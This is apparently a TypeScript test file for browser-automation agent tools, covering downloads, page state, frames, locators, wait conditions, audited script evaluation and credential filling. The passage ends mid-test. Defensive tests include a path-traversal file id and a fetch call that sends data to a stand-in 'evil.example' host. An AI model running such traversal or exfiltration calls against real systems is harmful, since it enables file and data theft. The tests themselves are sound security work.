Deno.test('tools: list_files and get_file never create a session', async () => {
	const registry = new SessionRegistry({ reapIntervalMs: 0, launch: () => Promise.resolve(fakeSession().session) });
	const ctx: ToolContext = { registry, allowedDomains: [], principal: 'test' };
	const listed = await assertRejects(() => tools.browserListFiles({}, ctx), ToolError);
	assertEquals(listed.code, 'unknown-session');
	const fetched = await assertRejects(() => tools.browserGetFile({ file_id: 'G1' }, ctx), ToolError);
	assertEquals(fetched.code, 'unknown-session');
	assertEquals(registry.size, 0, 'a peek must not launch the default session');
	await registry.shutdown();
});

Deno.test('tools: list_files on a live session reports the inline limit and an empty list', async () => {
	const { ctx, registry, record } = await harness();
	const result = await tools.browserListFiles({}, ctx);
	const parsed = JSON.parse(textOf(result)) as { session_id: string; files: unknown[]; inline_limit_bytes: number };
	assertEquals(parsed.session_id, record.id);
	assertEquals(parsed.files, []);
	assertEquals(parsed.inline_limit_bytes, 1024 * 1024);
	await registry.shutdown();
});

Deno.test('tools: get_file on an unknown id is unknown-file, and never a path', async () => {
	const { ctx, registry } = await harness();
	const error = await assertRejects(() => tools.browserGetFile({ file_id: '../etc/passwd' }, ctx), ToolError);
	assertEquals(error.code, 'unknown-file');
	await registry.shutdown();
});

Deno.test('tools: a click whose action result names a tracked download appends its metadata', async () => {
	const fake = fakeSession({ selectorMap: new Map([[3, fakeNode()]]) });
	// The action layer reports the download it detected; the ledger knows the record.
	fake.session.eventBus.dispatch = ((event: Record<string, unknown>) => {
		fake.dispatched.push({ name: event.constructor.name, event });
		return { eventResult: () => Promise.resolve({ download: { guid: 'G1', completed: true } }) };
	}) as never;
	const ledgerRecord = {
		guid: 'G1',
		url: 'http://x/r?token=secret',
		suggestedFilename: 'r.txt',
		fileName: 'r.txt',
		path: '/downloads/G1',
		fileSize: 3,
		receivedBytes: 3,
		totalBytes: 3,
		fileType: 'txt',
		mimeType: null,
		autoDownload: false,
		state: 'completed' as const,
		startedAt: 1,
		completedAt: 2,
		error: null,
	};
	const registry = new SessionRegistry({
		reapIntervalMs: 0,
		launch: () =>
			Promise.resolve({
				session: fake.session,
				downloads: { downloads: [ledgerRecord], isRemoteBrowser: false, lookup: () => ledgerRecord } as never,
				downloadsDir: null,
			}),
	});
	const ctx: ToolContext = { registry, allowedDomains: [], principal: 'test' };
	await registry.resolve(undefined);
	const result = await tools.browserClick({ index: 3 }, ctx);
	const joined = textOf(result);
	assertStringIncludes(joined, 'Clicked element 3 in session default.');
	assertStringIncludes(joined, '"file_id": "G1"');
	assert(!joined.includes('/downloads/G1'), 'no path in the click result');
	assert(!joined.includes('token=secret'), 'no source URL in the click result');
	const structured = (result as { structuredContent?: { download?: { file_id: string; available: boolean } } })
		.structuredContent;
	assertEquals(structured?.download?.file_id, 'G1');
	assertEquals(structured?.download?.available, true);
	await registry.shutdown();
});

Deno.test('tools: a click with no download keeps the plain text result', async () => {
	const { ctx, registry } = await harness({ selectorMap: new Map([[3, fakeNode()]]) });
	const result = await tools.browserClick({ index: 3 }, ctx);
	assertEquals((result.content as unknown[]).length, 1);
	assertEquals(textOf(result), 'Clicked element 3 in session default.');
	await registry.shutdown();
});

// --- B1.5: the element record on the wire -------------------------------------------------------

Deno.test('tools: browser_get_state with no new argument keeps the text block byte-identical (additivity, I-4)', async () => {
	const h = await captureHarness('form_attributes');
	try {
		const result = await tools.browserGetState({}, h.ctx) as {
			content: Array<{ text: string }>;
			structuredContent: Record<string, unknown>;
		};
		const frozen = JSON.parse(result.content[0]!.text) as { interactive_elements: Array<Record<string, unknown>> };
		// The text block is exactly the 0.1.0 payload: five keys per element at most, none of the new
		// root keys, and rendered with the same two-space indentation.
		for (const element of frozen.interactive_elements) {
			for (const key of Object.keys(element)) assert(['index', 'tag', 'label', 'role', 'href'].includes(key), key);
		}
		for (const key of ['state_token', 'frames', 'focused_index', 'elements_total', 'capture_truncated']) {
			assert(!(key in frozen), `${key} leaked into the text block`);
			assert(key in result.structuredContent, `${key} missing from structuredContent`);
		}
		// Omitted `fields` is `core`: geometry and frame identity, no locator (D-035), no heavy field.
		const rich = result.structuredContent.interactive_elements as Array<Record<string, unknown>>;
		assert(rich.every((element) => 'bounds' in element && 'frame_id' in element && 'visible' in element));
		assert(rich.every((element) => !('locator' in element) && !('attrs' in element) && !('input' in element)));
		assertEquals(result.structuredContent.elements_truncated, false);
	} finally {
		await h.registry.shutdown();
	}
});

Deno.test('tools: browser_get_state fields select the record, and the text block still does not grow', async () => {
	const h = await captureHarness('form_attributes');
	try {
		const minimal = await tools.browserGetState({ fields: ['minimal'] }, h.ctx) as { content: Array<{ text: string }> };
		const full = await tools.browserGetState({ fields: ['full'] }, h.ctx) as {
			content: Array<{ text: string }>;
			structuredContent: Record<string, unknown>;
		};
		assertEquals(
			full.content[0]!.text,
			minimal.content[0]!.text,
			'the text block is the same bytes under every preset',
		);
		const rich = full.structuredContent.interactive_elements as Array<Record<string, unknown>>;
		assert(rich.some((element) => 'input' in element && 'attrs' in element && 'locators' in element));
		assert(!JSON.stringify(full).includes('P4ssw0rd-SENTINEL'), 'the corpus password is on no surface');
	} finally {
		await h.registry.shutdown();
	}
});

Deno.test('tools: browser_scroll reports the geometry after the scroll, not the cached one before it', async () => {
	// The cached state says scrollY 0. The live DOM-less read the handler now makes answers what the
	// page reports after the action; the fake models a browser that moved by the amount asked.
	const fake = fakeSession({ selectorMap: new Map() });
	let scrolledTo = 0;
	(fake.session as unknown as { getBrowserStateSummary: (o: { includeDom?: boolean }) => Promise<unknown> })
		.getBrowserStateSummary = (options) => {
			assertEquals(options.includeDom, false, 'the after-read must never rebuild the index table (E-36)');
			return Promise.resolve({
				stateError: null,
				pageInfo: { scrollX: 0, scrollY: scrolledTo, pixelsAbove: scrolledTo, pixelsBelow: 100, viewportHeight: 720 },
			});
		};
	const registry = new SessionRegistry({ reapIntervalMs: 0, launch: () => Promise.resolve(fake.session) });
	const ctx: ToolContext = { registry, allowedDomains: [], principal: 'test' };
	await registry.resolve(undefined);
	scrolledTo = 540;
	const result = await tools.browserScroll({ direction: 'down' }, ctx) as {
		structuredContent: { scroll: { y: number } };
	};
	assertEquals(result.structuredContent.scroll.y, 540);
	await registry.shutdown();
});

// --- B1.6: frames and the locator tools ---------------------------------------------------------

Deno.test('tools: browser_get_frames lists the frames with both honesty markers and the token', async () => {
	const h = await captureHarness('iframe_crossorigin');
	try {
		const result = await tools.browserGetFrames({}, h.ctx) as {
			structuredContent: {
				frames: Array<{ id: string; parent: string | null; is_oopif: boolean; bounds_composed: boolean; url: string }>;
				capture_truncated: boolean;
				state_token: string | null;
			};
		};
		const payload = result.structuredContent;
		assertEquals(payload.frames.length, 2);
		assertEquals(payload.frames[0]!.parent, null);
		assertEquals(payload.frames[1]!.is_oopif, true);
		assertEquals(payload.frames[1]!.bounds_composed, true);
		assertStringIncludes(payload.frames[1]!.url, 'localhost:38112');
		assertEquals(payload.capture_truncated, false);
		assert(typeof payload.state_token === 'string');
	} finally {
		await h.registry.shutdown();
	}
});

Deno.test('tools: browser_locator_candidates resolves the index like an action would, token included', async () => {
	const h = await captureHarness('iframe_crossorigin');
	try {
		// The index is resolved against the held table exactly as an action would resolve it (the
		// `no-state` and `unknown-index` outcomes are `nodeAt`'s and are proven above).
		await tools.browserGetState({}, h.ctx);
		const held = h.record.session.cachedBrowserState!.stateToken!;
		const result = await tools.browserLocatorCandidates({ index: 15, state_token: held }, h.ctx) as {
			structuredContent: {
				index: number;
				frame_id: string;
				locators: Array<{ kind: string; value: string; unique: boolean }>;
				best: { kind: string; value: string } | null;
				state_token: string;
			};
		};
		const payload = result.structuredContent;
		assertEquals(payload.index, 15);
		assertEquals(payload.locators.map((c) => c.kind), ['id', 'aria', 'text']);
		assertEquals(payload.best, payload.locators[0] ?? null, 'the first unique candidate');
		assertEquals(payload.state_token, held);
		// And a stale token is refused rather than answered from a different table.
		const error = await assertRejects(
			() => tools.browserLocatorCandidates({ index: 15, state_token: '0000000000000000.0000000000000000' }, h.ctx),
			ToolError,
		);
		assertEquals(error.code, 'element-not-found');
	} finally {
		await h.registry.shutdown();
	}
});

Deno.test('tools: browser_verify_locator counts aria and label in memory, refuses a malformed value', async () => {
	const h = await captureHarness('iframe_crossorigin');
	try {
		const result = await tools.browserVerifyLocator(
			{ locator: { kind: 'aria', value: 'role=button[name="Host page button"]' } },
			h.ctx,
		) as {
			structuredContent: {
				matches: number;
				unique: boolean;
				first: { index: number; label?: string } | null;
				frame_id: string;
			};
		};
		assertEquals(result.structuredContent.matches, 1);
		assertEquals(result.structuredContent.unique, true);
		assertEquals(result.structuredContent.first?.label, 'Host page button');
		// The child frame's button is not in the top document: searched there, it names nothing — a
		// success with matches 0 and first null, never an error.
		const none = await tools.browserVerifyLocator(
			{ locator: { kind: 'aria', value: 'role=button[name="Cross origin button"]' } },
			h.ctx,
		) as { structuredContent: { matches: number; first: unknown } };
		assertEquals(none.structuredContent.matches, 0);
		assertEquals(none.structuredContent.first, null);
		const malformed = [['aria', 'button named x'], ['label', 'Password'], ['text', 'Save'], ['css', '  ']] as const;
		for (const [kind, value] of malformed) {
			const error = await assertRejects(
				() => tools.browserVerifyLocator({ locator: { kind, value } }, h.ctx),
				ToolError,
			);
			assertEquals(error.code, 'invalid-arguments', `${kind}: ${value}`);
		}
		const unknownFrame = await assertRejects(
			() => tools.browserVerifyLocator({ locator: { kind: 'label', value: 'label=x' }, frame_id: 'nope' }, h.ctx),
			ToolError,
		);
		assertEquals(unknownFrame.code, 'invalid-arguments');
	} finally {
		await h.registry.shutdown();
	}
});

Deno.test('tools: browser_verify_locator discards every DOM search before returning, on success and on failure', async () => {
	// A fake CDP client that records the DOM search calls. The selector kinds go to the browser, and
	// a leaked search id is a Chromium-side allocation nobody frees, so the discard is asserted on
	// both paths rather than assumed.
	const h = await captureHarness('iframe_crossorigin');
	try {
		const calls: string[] = [];
		let failGet = false;
		const dom = {
			performSearch: () => {
				calls.push('performSearch');
				return Promise.resolve({ searchId: 'S1', resultCount: 2 });
			},
			getSearchResults: () => {
				calls.push('getSearchResults');
				if (failGet) return Promise.reject(new Error('boom'));
				return Promise.resolve({ nodeIds: [1, 2] });
			},
			describeNode: ({ nodeId }: { nodeId: number }) => {
				calls.push(`describeNode:${nodeId}`);
				// Node 2 maps to the host button's backendNodeId; node 1 maps to nothing the index holds.
				const button = [...h.record.session.cachedBrowserState!.domState.selectorMap.values()]
					.find((node) => node.attributes['id'] === 'host-button')!;
				return Promise.resolve({ node: { backendNodeId: nodeId === 2 ? button.backendNodeId : 999_999 } });
			},
			discardSearchResults: ({ searchId }: { searchId: string }) => {
				calls.push(`discard:${searchId}`);
				return Promise.resolve({});
			},
		};
		const session = h.record.session as unknown as Record<string, unknown>;
		const rootSessionId = h.capture.sessions[0]!.sessionId;
		session.cdpClient = { send: { DOM: dom } };
		session.sessionManager = {
			getOrCreateCdpSession: () => Promise.resolve({ sessionId: rootSessionId, targetId: 'T' }),
			resyncTargets: () => Promise.resolve(),
		};
		session.agentFocusTargetId = 'T';

		const ok = await tools.browserVerifyLocator({ locator: { kind: 'id', value: '#host-button' } }, h.ctx) as {
			structuredContent: { matches: number; unique: boolean; first: { label?: string } | null };
		};
		assertEquals(ok.structuredContent.matches, 2, 'the browser count is reported as the browser gave it');
		assertEquals(ok.structuredContent.unique, false);
		assertEquals(ok.structuredContent.first?.label, 'Host page button', 'the first result that maps to an index');
		assertEquals(calls, ['performSearch', 'getSearchResults', 'describeNode:1', 'describeNode:2', 'discard:S1']);

		calls.length = 0;
		failGet = true;
		const error = await assertRejects(
			() => tools.browserVerifyLocator({ locator: { kind: 'css', value: 'button' } }, h.ctx),
			ToolError,
		);
		assertEquals(error.code, 'browser-unavailable');
		assertEquals(calls, ['performSearch', 'getSearchResults', 'discard:S1'], 'discarded on the failure path too');
	} finally {
		await h.registry.shutdown();
	}
});

// --- browser_wait_for (B1.7) --------------------------------------------------

Deno.test('wait_for: exactly one condition, or invalid-arguments', async () => {
	const h = await harness();
	try {
		for (const until of [{}, { navigation: true as const, dialog: true as const }]) {
			const error = await assertRejects(
				() => tools.browserWaitFor({ until, timeout_ms: 100 }, h.ctx),
				ToolError,
			);
			assertEquals(error.code, 'invalid-arguments');
			assertStringIncludes(error.message, 'exactly one');
		}
	} finally {
		await h.registry.shutdown();
	}
});

Deno.test('wait_for: an expired wait is a success carrying met false, never an error', async () => {
	const h = await harness();
	try {
		const result = await tools.browserWaitFor({ until: { navigation: true }, timeout_ms: 60 }, h.ctx);
		const payload = (result as { structuredContent: Record<string, unknown> }).structuredContent;
		assertEquals(payload.met, false);
		assertEquals(payload.event, null);
		assertEquals((result as { isError?: boolean }).isError, undefined);
		// The elapsed time is reported honestly rather than as the budget.
		assert(typeof payload.after_ms === 'number' && payload.after_ms >= 0);
	} finally {
		await h.registry.shutdown();
	}
});

Deno.test('wait_for: network_idle needs a connected session and says so', async () => {
	// The fake session carries no CDP client, which is exactly the shape a caller
	// hits between a session being reaped and relaunched.
	const h = await harness();
	try {
		const error = await assertRejects(
			() => tools.browserWaitFor({ until: { network_idle: 100 }, timeout_ms: 200 }, h.ctx),
			ToolError,
		);
		assertEquals(error.code, 'browser-unavailable');
	} finally {
		await h.registry.shutdown();
	}
});

Deno.test('wait_for: a state_token that is already stale is met at once', async () => {
	const h = await captureHarness('form_attributes');
	try {
		const result = await tools.browserWaitFor(
			{ until: { state_token_changes: 'aaaaaaaaaaaaaaaa.bbbbbbbbbbbbbbbb' }, timeout_ms: 5000 },
			h.ctx,
		);
		const payload = (result as { structuredContent: Record<string, unknown> }).structuredContent;
		assertEquals(payload.met, true, 'the held token is not the one the caller named');
		assertEquals(payload.event, null, 'a token change is not an event on the ring');
		assert(typeof payload.state_token === 'string', 'and the current token comes back');
	} finally {
		await h.registry.shutdown();
	}
});

Deno.test('wait_for: waiting on the current state_token expires rather than firing', async () => {
	const h = await captureHarness('form_attributes');
	try {
		const observed = await tools.browserGetState({}, h.ctx);
		const current = (observed as { structuredContent: Record<string, unknown> }).structuredContent.state_token;
		assert(typeof current === 'string');
		const result = await tools.browserWaitFor(
			{ until: { state_token_changes: current }, timeout_ms: 120 },
			h.ctx,
		);
		assertEquals((result as { structuredContent: Record<string, unknown> }).structuredContent.met, false);
	} finally {
		await h.registry.shutdown();
	}
});

Deno.test('wait_for: a selector predicate on a session with no CDP client expires quietly', async () => {
	// The search throws and is caught: a page read that cannot run is "not yet",
	// not a tool failure, because the caller asked whether something is there.
	const h = await harness();
	try {
		const result = await tools.browserWaitFor({ until: { selector: '#nope' }, timeout_ms: 120 }, h.ctx);
		const payload = (result as { structuredContent: Record<string, unknown> }).structuredContent;
		assertEquals(payload.met, false);
	} finally {
		await h.registry.shutdown();
	}
});

Deno.test('wait_for: a dialog on the ring satisfies a dialog wait', async () => {
	const h = await harness();
	try {
		const waiting = tools.browserWaitFor({ until: { dialog: true }, timeout_ms: 5000 }, h.ctx);
		await new Promise((resolve) => setTimeout(resolve, 10));
		h.record.events.append('dialog', { dialog_id: 'd1', kind: 'confirm', message: 'ok?' });
		const result = await waiting;
		const payload = (result as { structuredContent: Record<string, unknown> }).structuredContent;
		assertEquals(payload.met, true);
		assertEquals((payload.event as { kind: string }).kind, 'dialog');
	} finally {
		await h.registry.shutdown();
	}
});

Deno.test('wait_for: a download wait is satisfied by any of the three download kinds', async () => {
	for (const kind of ['download.started', 'download.done', 'download.failed'] as const) {
		const h = await harness();
		try {
			const waiting = tools.browserWaitFor({ until: { download: true }, timeout_ms: 5000 }, h.ctx);
			await new Promise((resolve) => setTimeout(resolve, 10));
			h.record.events.append(kind, { file_id: 'g', filename: 'f', status: 'completed' });
			const payload = (await waiting as { structuredContent: Record<string, unknown> }).structuredContent;
			assertEquals(payload.met, true, kind);
			assertEquals((payload.event as { kind: string }).kind, kind);
		} finally {
			await h.registry.shutdown();
		}
	}
});

Deno.test('wait_for: a closed session ends the wait rather than holding it to the deadline', async () => {
	const h = await harness();
	try {
		const waiting = tools.browserWaitFor({ until: { navigation: true }, timeout_ms: 30_000 }, h.ctx);
		await new Promise((resolve) => setTimeout(resolve, 10));
		await h.registry.close(h.record.id, 'session-closed');
		const payload = (await waiting as { structuredContent: Record<string, unknown> }).structuredContent;
		assertEquals(payload.met, false);
	} finally {
		await h.registry.shutdown();
	}
});

// --- B2.7: browser_evaluate ---------------------------------------------------

/**
 * Wires a capture-backed session to a scripted `Runtime.evaluate` / `Page.getFrameTree` pair.
 *
 * The frame list is the capture's own, so the frame id the handler reports and the OOPIF routing are
 * real; only the two CDP round trips are scripted.
 */
function wireEvaluate(
	record: { session: unknown },
	answer: (params: Record<string, unknown>) => Promise<unknown>,
	frameUrl = 'https://example.com/page',
) {
	const calls: Array<{ method: string; params: Record<string, unknown> }> = [];
	const session = record.session as Record<string, unknown>;
	const topFrameId = (session.cachedBrowserState as { frames: Array<{ frameId: string }> }).frames[0]!.frameId;
	session.cdpClient = {
		send: {
			Runtime: {
				evaluate: (params: Record<string, unknown>) => {
					calls.push({ method: 'Runtime.evaluate', params });
					return answer(params);
				},
			},
			Page: {
				getFrameTree: () => {
					calls.push({ method: 'Page.getFrameTree', params: {} });
					return Promise.resolve({ frameTree: { frame: { id: topFrameId, url: frameUrl } } });
				},
			},
		},
	};
	session.sessionManager = { getOrCreateCdpSession: () => Promise.resolve({ sessionId: 'S1', targetId: 'T' }) };
	session.agentFocusTargetId = 'T';
	return { calls, topFrameId };
}

Deno.test('B2.7: browser_evaluate returns the value and writes exactly one audit entry', async () => {
	const h = await captureHarness('form_attributes');
	try {
		const wired = wireEvaluate(h.record, () => Promise.resolve({ result: { type: 'number', value: 42 } }));
		const result = await tools.browserEvaluate({ expression: '6 * 7' }, h.ctx) as {
			structuredContent: { ok: boolean; type: string; value: unknown; truncated: boolean; audit_id: string };
		};
		assertEquals(result.structuredContent.ok, true);
		assertEquals(result.structuredContent.value, 42);
		assertEquals(result.structuredContent.truncated, false);
		assert(wired.calls.some((call) => call.method === 'Runtime.evaluate'));

		const ledger = h.record.audit.read({ principal: 'test' });
		assertEquals(ledger.entries.length, 1);
		const entry = ledger.entries[0]!;
		assertEquals(entry.kind, 'evaluate');
		assertEquals(entry.audit_id, result.structuredContent.audit_id);
		assertEquals(entry.principal, 'test');
		assertEquals(entry.expression_bytes, 5);
		assertEquals(entry.origin, 'https://example.com');
		assertEquals(entry.ok, true);
	} finally {
		await h.registry.shutdown();
	}
});

Deno.test('B2.7: the expression body never reaches the audit ledger or the result', async () => {
	const h = await captureHarness('form_attributes');
	const sentinel = 'Zq8-EXPR-SENTINEL-3vP';
	try {
		wireEvaluate(h.record, () => Promise.resolve({ result: { type: 'undefined' } }));
		const result = await tools.browserEvaluate(
			{ expression: `fetch('https://evil.example/?c=${sentinel}')` },
			h.ctx,
		);
		const serialized = JSON.stringify(result) + JSON.stringify(h.record.audit.read({ principal: 'test', all: true }));
		assert(!serialized.includes(sentinel), 'the expression body escaped into a result or the ledger');
		assert(!serialized.includes('evil.example'), 'an expression fragment escaped');
		assert(!serialized.includes('fetch('), 'an expression prefix escaped');
	} finally {
		await h.registry.shutdown();
	}
});

Deno.test('B2.7: a page exception is a SUCCESS result with ok:false, and is still audited', async () => {
	const h = await captureHarness('form_attributes');
	try {
		wireEvaluate(h.record, () =>
			Promise.resolve({
				result: { type: 'object' },
				exceptionDetails: { exception: { description: 'TypeError: nope is not a function' } },
			}));
		const result = await tools.browserEvaluate({ expression: 'nope()' }, h.ctx) as {
			isError?: boolean;
			structuredContent: { ok: boolean; error_text?: string };
		};
		assertEquals(result.isError, undefined, 'a page exception must not be a tool error');
		assertEquals(result.structuredContent.ok, false);
		assertStringIncludes(result.structuredContent.error_text ?? '', 'TypeError');
		// "Arbitrary code ran here" is the fact the ledger exists for, and an expression that throws
		// has still run.
		assertEquals(h.record.audit.read({ principal: 'test' }).entries[0]?.ok, false);
	} finally {
		await h.registry.shutdown();
	}
});

Deno.test('B2.7: browser_evaluate is refused while a human holds the session', async () => {
	const h = await captureHarness('form_attributes');
	try {
		wireEvaluate(h.record, () => Promise.resolve({ result: { type: 'undefined' } }));
		h.record.lock = { principal: 'human', takenAt: Date.now() } as never;
		const error = await assertRejects(() => tools.browserEvaluate({ expression: '1' }, h.ctx), ToolError);
		assertEquals(error.code, 'human-has-control');
		assertEquals(h.record.audit.read({ principal: 'test' }).entries.length, 0, 'a refusal writes no entry');
	} finally {
		h.record.lock = null;
		await h.registry.shutdown();
	}
});

Deno.test('B2.7: an unreadable frame URL costs the origin, never the audit record', async () => {
	const h = await captureHarness('form_attributes');
	try {
		const session = h.record.session as unknown as Record<string, unknown>;
		wireEvaluate(h.record, () => Promise.resolve({ result: { type: 'undefined' } }));
		// The frame detaches between the evaluation and the ledger write.
		((session.cdpClient as { send: { Page: { getFrameTree: unknown } } }).send.Page as { getFrameTree: unknown })
			.getFrameTree = () => Promise.reject(new Error('target closed'));
		await tools.browserEvaluate({ expression: '1' }, h.ctx);
		assertEquals(h.record.audit.read({ principal: 'test' }).entries[0]?.origin, '');
	} finally {
		await h.registry.shutdown();
	}
});

/**
 * **S3-R, row 3f / C-15 — the regression ruling R1 exists to prevent.**
 *
 * `browser_evaluate` has accepted `frame_id` since B2.7, and naming the top frame's id has always
 * worked: `frameContext` resolved it to the page session and `Runtime.evaluate` landed in that
 * session's default context, which *is* the top document. A narrow `isTop` would have sent that
 * shipped call to Gate C instead — an unannounced breaking change to a working path.
 *
 * Proved by **equality of the wire**, not by assertion about it: the same expression is sent twice,
 * once naming the root and once omitting `frame_id` (which is the 0.2.0 call by construction), and
 * the two recorded call lists are compared whole — method, order and parameters. `wireEvaluate`
 * scripts only `Runtime.evaluate` and `Page.getFrameTree`, so a Gate C detour would also fail
 * structurally: `client.send.DOM` does not exist on this wire.
 */
Deno.test('S3-R: browser_evaluate {frame_id: <top id>} is the 0.2.0 call, byte for byte (3f, C-15)', async () => {
	const named = await captureHarness('form_attributes');
	const omitted = await captureHarness('form_attributes');
	try {
		const answer = () => Promise.resolve({ result: { type: 'number', value: 42 } });
		const wiredNamed = wireEvaluate(named.record, answer);
		const wiredOmitted = wireEvaluate(omitted.record, answer);

		const withId = await tools.browserEvaluate(
			{ expression: '6 * 7', frame_id: wiredNamed.topFrameId },
			named.ctx,
		) as { structuredContent: Record<string, unknown> };
		const without = await tools.browserEvaluate({ expression: '6 * 7' }, omitted.ctx) as {
			structuredContent: Record<string, unknown>;
		};

		// The whole wire, in order, with every parameter.
		assertEquals(wiredNamed.calls, wiredOmitted.calls);
		assertEquals(wiredNamed.calls.map((call) => call.method), ['Runtime.evaluate', 'Page.getFrameTree']);
		// And the shape itself, spelled out, so a future edit to the evaluation path has to say so here.
		assertEquals(wiredNamed.calls[0]?.params, {
			expression: '6 * 7',
			returnByValue: true,
			awaitPromise: true,
			silent: true,
			timeout: 1000,
		});
		// Never the receiver-addressed form: `callFunctionOn` compiles the caller's text as an
		// expression and carries no renderer-side deadline, which would be a silent contract change.
		assertEquals(wiredNamed.calls.filter((call) => call.method === 'Runtime.callFunctionOn'), []);

		// The answer too, modulo the ULID that is different by construction.
		const strip = (payload: Record<string, unknown>) => ({ ...payload, audit_id: '<ulid>', session_id: '<id>' });
		assertEquals(strip(withId.structuredContent), strip(without.structuredContent));
		assertEquals(withId.structuredContent.frame_id, wiredNamed.topFrameId);
		assertEquals(withId.structuredContent.value, 42);

		// One `evaluate` row each, and the origin is the top document's on both.
		const rowNamed = named.record.audit.read({ principal: 'test' }).entries;
		const rowOmitted = omitted.record.audit.read({ principal: 'test' }).entries;
		assertEquals(rowNamed.length, 1);
		assertEquals(rowNamed[0]?.origin, rowOmitted[0]?.origin);
		assertEquals(rowNamed[0]?.frame_id, rowOmitted[0]?.frame_id);
	} finally {
		await omitted.registry.shutdown();
		await named.registry.shutdown();
	}
});

// --- B2.8: browser_fill_secret, the zoom guard and the audit reader ------------

/** The password input the `form_attributes` capture carries, with its sentinel value. */
const PASSWORD_INDEX = 6;
/** A `type=date` input: an element the index resolves to that a credential must not go into. */
const DATE_INDEX = 3;
/** The capture's single frame. */
const FORM_FRAME = 'A4B12682576331EE39AA9EFE83F974E0';

interface SecretWire {
	readonly topUrl?: string;
	readonly frameUrl?: string;
	readonly scale?: number;
	/**
	 * Drops the element's frame from the live tree: the page navigated, or Chromium replaced the main
	 * frame, between the state read and the fill. C-16's one condition.
	 */
	readonly dropFrame?: boolean;
}

/** Wires the capture-backed session with a scripted frame tree and layout metrics. */
function wireSecrets(record: { session: unknown }, wire: SecretWire = {}) {
	const calls: string[] = [];
	const session = record.session as Record<string, unknown>;
	const topUrl = wire.topUrl ?? 'https://bank.example.com/login';
	const frameUrl = wire.frameUrl ?? topUrl;
	session.cdpClient = {
		send: {
			Page: {
				getFrameTree: () => {
					calls.push('Page.getFrameTree');
					// The frameset shape SEC-07 names: a top document and a child holding the field. When
					// the two URLs are equal this is just the ordinary single-document case.
					return Promise.resolve({
						frameTree: {
							frame: { id: 'TOP', url: topUrl },
							childFrames: wire.dropFrame === true ? [] : [{ frame: { id: FORM_FRAME, url: frameUrl } }],
						},
					});
				},
				getLayoutMetrics: () => {
					calls.push('Page.getLayoutMetrics');
					const scale = wire.scale ?? 1;
					return Promise.resolve({
						layoutViewport: { pageX: 0, pageY: 0, clientWidth: 1280, clientHeight: 720 },
						visualViewport: { offsetX: 0, offsetY: 0, pageX: 0, pageY: 0, clientWidth: 1280, clientHeight: 720, scale },
						contentSize: { x: 0, y: 0, width: 1280, height: 2000 },
						cssVisualViewport: {
							offsetX: 0,
							offsetY: 0,
							pageX: 0,
							pageY: 0,
							clientWidth: 1280,
							clientHeight: 720,
							scale,
						},
					});
				},
			},
		},
	};
	session.sessionManager = { getOrCreateCdpSession: () => Promise.resolve({ sessionId: 'S1', targetId: 'T' }) };
	session.agentFocusTargetId = 'T';
	return { calls };
}

const BANK_SECRET = 'Zq8-BANK-SECRET-VALUE-3vP';

/** Every number anywhere in a structure, so "no field carries the length" is checkable. */
function numbersIn(value: unknown): number[] {
	if (typeof value === 'number') return [value];
	if (Array.isArray(value)) return value.flatMap(numbersIn);
	if (value !== null && typeof value === 'object') return Object.values(value).flatMap(numbersIn);
	return [];
}

async function secretHarness(wire: SecretWire = {}) {
	const h = await captureHarness('form_attributes');
	const wired = wireSecrets(h.record, wire);
	const secrets = new SecretStore([
		{ name: 'bank_password', value: BANK_SECRET, domains: ['bank.example.com'] },
		{ name: 'anywhere', value: 'Zq8-UNPINNED-VALUE-3vP', domains: [] },
		// Pinned to the capture's own host. Until D-096 this was the URL `browser_type` read through
		// `getBrowserStateSummary` rather than through the scripted frame tree (finding B2-SR8-1); both
		// paths now read the element's frame from the frame tree, so on this fixture it is refused.
		//
		// The pattern carries an explicit `http://` because the capture's URL is
		// `http://127.0.0.1:38111/…` and SEC-FH-23 made the pin https-only for a scheme-less pattern.
		// This is the documented escape hatch (the matcher's M4 scheme rule; SECURITY-AUTH.md §7.1) and the only shape that lets
		// a credential be typed over plaintext, stated by the operator rather than inherited from a
		// predicate that never asked. The bare `127.0.0.1` form is now a *refusal* over http, and
		// `secrets_test.ts` owns that row so this fixture's change cannot quietly delete the rule.
		{ name: 'local_password', value: 'Zq8-LOCAL-SECRET-3vP', domains: ['http://127.0.0.1'] },
	]);
	const dispatched: Array<Record<string, unknown>> = [];
	const bus = h.record.session.eventBus as unknown as { dispatch(event: unknown): unknown };
	const original = bus.dispatch.bind(bus);
	bus.dispatch = (event: Record<string, unknown>) => {
		dispatched.push(event);
		return { eventResult: () => Promise.resolve('ok') };
	};
	const token = h.record.session.cachedBrowserState?.stateToken as string;
	const ctx: ToolContext = { ...h.ctx, secrets };
	return { ...h, ctx, wired, dispatched, token, secrets, restore: () => (bus.dispatch = original) };
}

Deno.test('B2.8: a pinned secret is typed into a password field, and neither the value nor its length appears', async () => {
	const f = await secretHarness();
	try {
		const result = await tools.browserFillSecret(
			{ index: PASSWORD_INDEX, secret: 'bank_password', state_token: f.token },
			f.ctx,
		) as { structuredContent: Record<string, unknown>; content: Array<{ text?: string }> };

		// The value reached the page.
		assertEquals(f.dispatched.length, 1);
		assertEquals((f.dispatched[0] as { text?: string }).text, BANK_SECRET);
		assertEquals((f.dispatched[0] as { isSensitive?: boolean }).isSensitive, true);

		// And nowhere else. Not the value, not a prefix, not the length — E-38's rule, on the surface
		// that names the credential explicitly.
		const emitted = [result, f.record.audit.read({ principal: 'test' })];
		const serialized = JSON.stringify(emitted);
		assert(!serialized.includes(BANK_SECRET), serialized);
		assert(!serialized.includes(BANK_SECRET.slice(0, 6)), `a prefix leaked: ${serialized}`);
		// The length, checked **structurally** rather than as a substring: a two-digit number occurs by
		// chance inside a frame id or a ULID, and a test that fails on coincidence is one that gets
		// weakened rather than fixed. What must not exist is a *field whose value is* the length.
		assertEquals(numbersIn(emitted).filter((value) => value === BANK_SECRET.length), [], 'a length-shaped field');

		assertEquals(result.structuredContent.secret, 'bank_password', 'the NAME is the one thing reported');
		assertEquals(result.structuredContent.origin, 'https://bank.example.com');
		assertEquals(result.structuredContent.frame_id, FORM_FRAME);
	} finally {
		f.restore();
		await f.registry.shutdown();
	}
});

Deno.test('B2.8: the refusals, each with its own code, and nothing is dispatched', async () => {
	const cases: Array<{ name: string; wire?: SecretWire; args: Record<string, unknown>; code: string }> = [
		{
			name: 'a stale state_token (AD-13: a reused backendNodeId in a new document)',
			args: { index: PASSWORD_INDEX, secret: 'bank_password', state_token: 'aaaaaaaaaaaaaaaa.bbbbbbbbbbbbbbbb' },
			code: 'element-not-found',
		},
		{ name: 'a non-input element', args: { index: 24, secret: 'bank_password' }, code: 'element-not-interactable' },
		{
			name: 'an input that is neither password nor text',
